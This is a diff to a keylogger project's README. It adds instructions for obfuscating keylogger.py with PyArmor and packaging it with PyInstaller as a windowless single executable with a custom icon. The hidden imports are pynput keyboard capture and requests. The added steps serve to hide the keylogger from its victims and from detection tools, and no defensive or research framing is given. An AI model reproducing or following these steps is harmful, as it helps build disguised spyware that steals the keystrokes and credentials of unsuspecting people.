@@ -41,6 +41,20 @@ python -m venv .venv
 pip install -r requirements.txt
 ```
 
+## Create a ofuscated Code With PyArmor(Install If necessary)
+   ```
+   pyarmor gen keylogger.py
+   ```
+This will create an obfuscated version of the code un the dist directory
+
+## Make an executable of the app
+To make this you will need Pyinstaller
+If you want to put an icon in the app, use the command --icon="path_of_your.ico"
+
+```
+pyinstaller --onefile --noconsole --icon="icon.ico" --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000" --hidden-import=pynput --hidden-import=pynput.keyboard --hidden-import=requests KeyLogger.py
+```
+
 ## Project Architecture
 
 The project consists of two main Python scripts:
